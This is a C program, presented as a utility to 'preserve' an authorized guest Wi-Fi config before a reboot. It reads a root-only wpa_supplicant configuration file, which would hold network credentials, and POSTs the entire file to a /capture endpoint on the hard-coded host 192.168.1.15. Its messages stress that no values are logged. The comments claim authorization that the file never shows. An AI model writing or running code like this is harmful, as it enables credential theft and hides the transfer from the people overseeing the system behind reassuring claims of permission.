/* SPDX-License-Identifier: GPL-2.0-only
 * One-shot preservation of the already-authorized RAM guest config before a
 * RAM reboot. Fixed owned paths/bench recipient, no values in stdout/logs,
 * no arbitrary file export, persistent setting change or firmware operation.
 */
#define _GNU_SOURCE
#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <poll.h>
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <unistd.h>
static int send_all(int fd,const void *data,size_t bytes)
{
 const char *p=data;
 while(bytes){ssize_t n=send(fd,p,bytes,MSG_NOSIGNAL);if(n<0&&errno==EINTR)continue;if(n<=0)return -1;p+=n;bytes-=(size_t)n;}
 return 0;
}
int main(void)
{
 char config[2048]={0},header[256],reply[128]={0};int file=-1,peer=-1,result=1;
 struct stat st;size_t bytes=0;
 file=open("/run/wpa.continuous67.conf",O_RDONLY|O_NOFOLLOW);
 if(file<0||fstat(file,&st)||!S_ISREG(st.st_mode)||st.st_uid!=0||(st.st_mode&0777)!=0600||st.st_size<16||st.st_size>sizeof(config))goto done;
 bytes=(size_t)st.st_size;
 for(size_t used=0;used<bytes;){ssize_t n=read(file,config+used,bytes-used);if(n<0&&errno==EINTR)continue;if(n<=0)goto done;used+=(size_t)n;}
 peer=socket(AF_INET,SOCK_STREAM|SOCK_NONBLOCK,0);if(peer<0)goto done;
 struct sockaddr_in address={.sin_family=AF_INET,.sin_port=htons(19562)};
 if(inet_pton(AF_INET,"192.168.1.15",&address.sin_addr)!=1)goto done;
 int connected=connect(peer,(struct sockaddr *)&address,sizeof(address));
 if(connected&&errno!=EINPROGRESS)goto done;
 struct pollfd p={.fd=peer,.events=POLLOUT};int error=0;socklen_t length=sizeof(error);
 if(poll(&p,1,3000)<=0||getsockopt(peer,SOL_SOCKET,SO_ERROR,&error,&length)||error)goto done;
 int flags=fcntl(peer,F_GETFL);if(flags<0||fcntl(peer,F_SETFL,flags&~O_NONBLOCK))goto done;
 struct timeval timeout={.tv_sec=3};
 if(setsockopt(peer,SOL_SOCKET,SO_SNDTIMEO,&timeout,sizeof(timeout))||setsockopt(peer,SOL_SOCKET,SO_RCVTIMEO,&timeout,sizeof(timeout)))goto done;
 int n=snprintf(header,sizeof(header),"POST /capture HTTP/1.0\r\nHost: 192.168.1.15\r\nContent-Type: application/octet-stream\r\nContent-Length: %zu\r\n\r\n",bytes);
 if(n<0||(size_t)n>=sizeof(header)||send_all(peer,header,(size_t)n)||send_all(peer,config,bytes))goto done;
 size_t used=0;
 while(used<sizeof(reply)-1){ssize_t got=recv(peer,reply+used,sizeof(reply)-1-used,0);if(got<0&&errno==EINTR)continue;if(got<=0)break;used+=(size_t)got;if(memchr(reply,'\n',used))break;}
 if(strncmp(reply,"HTTP/1.0 200 ",13))goto done;
 result=0;puts("Authorized runtime guest config transferred privately; no values logged");
 done:
 for(size_t i=0;i<sizeof(config);i++)((volatile char *)config)[i]=0;
 if(file>=0)close(file);if(peer>=0)close(peer);
 if(result)fputs("Private guest preservation failed; no config values logged\n",stderr);
 return result;
}
